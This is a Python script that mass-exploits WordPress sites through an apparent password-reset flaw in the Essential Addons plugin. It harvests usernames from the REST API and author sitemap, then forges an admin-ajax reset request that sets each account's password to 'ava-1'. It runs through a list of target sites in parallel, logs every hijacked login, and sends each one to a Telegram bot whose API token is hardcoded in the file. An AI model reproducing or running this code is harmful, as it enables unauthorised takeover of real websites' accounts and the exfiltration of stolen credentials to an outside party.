import requests,time,re,random,os,sys,json
from multiprocessing.dummy import Pool as ThreadPool
from colorama import Fore,Style, init
init(autoreset=True)

r = Fore.RED + Style.BRIGHT
g = Fore.GREEN + Style.BRIGHT
c = Fore.CYAN + Style.BRIGHT
y = Fore.YELLOW + Style.BRIGHT
o = Fore.RESET + Style.RESET_ALL


def send_to_telegram(message):
	apiToken = '5873014356:AAFg1xl66DG5GT-6bf82h5zrpzpdiWfnErs'
	chatID = '-5367053502'
	apiURL = ('https://api.telegram.org/bot'+ apiToken+'/sendMessage')
	try:
		response = requests.post(apiURL, json={'chat_id': chatID, 'text': message})
	except Exception as e:
		pass
		
headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        # 'Accept-Encoding': 'gzip, deflate, br',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Connection': 'keep-alive',
        # 'Cookie': 'wordpress_test_cookie=WP%20Cookie%20check; slimstat_tracking_code=3386.b77ee445be809a12d617d72914d52783',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
    }
    
def ambil_User(url):
	try:
		ngambil = requests.get(url+'/wp-json/wp/v2/users',headers=headers,timeout=10)
		if '"slug":"' in ngambil.content:
			hasil = re.findall('"slug":"(.*?)"', ngambil.text)
			user = hasil[0]
			RANDOME(url,user)
		else:
			print(y+url + ' ' +r+ 'FAILED GET USERNAME'+o)
		ngambile = requests.get(url+'/author-sitemap.xml',headers=headers,timeout=10)
		if 'Sitemap' in ngambile.content:
			jancok = re.findall('author/(.*?)/',ngambile.text)
			user = jancok[0]
			RANDOME(url,user)
		else:
			print(y+url + ' ' +r+ 'FAILED GET USERNAME'+o)
	except:
		pass

		

def RANDOME(url,user):
	try:
		response = requests.get(url, headers=headers,timeout=10).content 
		if 'ajaxurl' in response:
			nonce = re.findall('admin-ajax.php","nonce":"(.*?)"',response)[0]
		payload = {
		"action": "login_or_register_user",
		"eael-resetpassword-submit": "true",
		"page_id": "124",
		"widget_id": "224",
		"eael-resetpassword-nonce": nonce,
		"eael-pass1": 'ava-1',
		"eael-pass2": 'ava-1',
		"rp_login": user
		}
		response2 = requests.post(url +'/wp-admin/admin-ajax.php', headers=headers, data=payload,timeout=10)
		if 'success":true' in response2.text:
			print(y+'GAS' + ' ==> ' +g+ url +'/wp-login.php' +'|'+ user + '|' + 'ava-1'+o)
			open('resulst.txt','a').write(url +'/wp-login.php' +'|'+ user + '|' + 'ava-1'+'\n')
			send_to_telegram(url +'/wp-login.php' +'|'+ user + '|' + 'ava-1'+'\n')
		else:
			print(url +' '+r+ 'BAD'+o)
		
	except:
		#print(e)
		pass
		

if __name__ == '__main__':
	os.system('cls' if os.name == 'nt' else 'clear')
	print "{} 00Shinday00  | {}Shin Code\n".format(y,c)
	url = open(raw_input('List:~# '),'r').read().splitlines()
	pool = ThreadPool(int(20))
	pool.map(ambil_User, url)
	pool.close()
	pool.join()

